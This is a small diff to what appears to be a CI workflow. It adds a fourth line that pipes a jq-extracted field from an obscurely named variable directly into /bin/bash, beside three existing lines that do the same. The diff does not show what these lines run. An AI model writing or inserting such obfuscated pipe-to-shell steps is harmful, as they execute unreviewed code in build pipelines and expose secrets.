@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$dh24903" | jq -r .lq960 | /bin/bash
           printf '%s' "$x0" | jq -r .mtx072 | /bin/bash
           printf '%s' "$pf17866" | jq -r .xfbjx7 | /bin/bash
+          echo $eboxx683 | jq -r .joto320 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
